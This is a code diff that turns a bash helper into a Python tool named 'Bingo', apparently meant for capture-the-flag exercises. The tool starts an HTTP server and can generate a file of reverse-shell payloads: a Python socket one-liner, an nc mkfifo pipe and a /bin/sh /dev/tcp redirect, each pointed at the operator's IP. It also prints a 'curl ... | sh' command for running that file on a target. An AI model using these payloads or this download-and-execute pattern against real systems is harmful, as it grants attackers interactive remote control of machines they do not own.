@@ -1,36 +1,80 @@
-#!/bin/bash
-banner=$(shuf -i 0-1 -n 1)
-if [[ $banner -eq '1' ]]
-then
-toilet -f future 'Bingo' --filter metal --gay
-else
- toilet -f future 'Bingo' --filter metal
-fi
+#! /usr/bin/python3
 
-if [[ -z $1 ]]
-then
-echo ''
-echo 'usage: bingo port / only bingo command will open a server on port 8000'
-echo '* if you want to use port 80 run with privileges (sudo)'
-echo ''
-port='8000'
-else
-port=$1
-fi
-if (echo $port | egrep '[^0-9]' &> /dev/null); then
-red=`tput setaf 1`
-echo "${red} Only numbers!"
-exit
-fi
+import http.server
+import socketserver
+import os
+import argparse
+import netifaces as ni
+import pyfiglet
+from random import randint
+from termcolor import colored
+import sys
 
-iptun0=$(ip route | grep tun0 | grep src | cut -d " " -f 9)
-ipdefault=$(ip -o route get to 8.8.8.8 | sed -n 's/.*src \([0-9.]\+\).*/\1/p')
+def makebanner():
+	colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']
+	fonts=["smslant", "crawford","cursive","pyramid","stacey","slant","5lineoblique","ticks","contessa","hex","pawp","block","graffiti","linux","charact3","bulbhead"]
+	colorsint = randint(0, 5)
+	fontsint = randint(0, 15)
+	font = fonts[fontsint]
+	banner = pyfiglet.figlet_format("bingo", font = font)
+	print(colored(banner, colors[colorsint]))
 
-if [[ -z $iptun0 ]]
-then
-echo 'IP:' 'http://'$ipdefault':'$port'/'
-else
-echo 'IP:' 'http://'$iptun0':'$port'/'
-fi
+makebanner()
 
-python3 -m http.server $port
+parser = argparse.ArgumentParser(description = 'Bingo facility with python web servers for CTFs')
+parser.add_argument('-p', action = 'store', dest = 'port', default = 8000, required = False, type = int, help = 'Port to open http server.')
+parser.add_argument('-rs', action = 'store', dest = 'reverse_shell_port', required = False, help = 'To open a reverse shell code. (specify port)')
+arguments = parser.parse_args()
+
+port = arguments.port
+
+interfaces = ni.interfaces()
+if "tun0" in interfaces:
+    interface = "tun0" 
+elif "eth0" in interfaces:
+	interface = "eth0"
+elif "wlan0" in interfaces:
+	interface = "wlan0"
+
+def main():
+	global arguments
+	ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
+	if arguments.reverse_shell_port:
+		revfile = """
+
+		if command -v python > /dev/null 2>&1; then
+			python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{0}",{1})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+			exit;
+		fi
+
+		if command -v nc > /dev/null 2>&1; then
+			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f
+			exit;
+		fi
+
+		if command -v sh > /dev/null 2>&1; then
+			/bin/sh -i >& /dev/tcp/{0}/{1} 0>&1
+			exit;
+		fi """.format(ip, arguments.reverse_shell_port)
+		
+		if os.path.exists("bingors"):
+			os.remove("bingors")
+		
+		revfileh = open("bingors", "w")
+		revfileh.write(revfile)
+		revfileh.close()
+
+	handler = http.server.SimpleHTTPRequestHandler
+	with socketserver.TCPServer(("", port), handler) as httpd:
+	    print("HTTP server opened on port", port)
+	    print("Url:","http://"+str(ip)+":"+str(port))
+	    if arguments.reverse_shell_port:
+		    message = "CMD: curl http://"+str(ip)+":"+str(port)+"/bingors"+"|"+"sh"
+		    print(message)
+	    httpd.serve_forever()
+try:
+	main()
+except KeyboardInterrupt:
+	print(colored("\nExit", "red"))
+	os.remove("bingors")
+	exit()
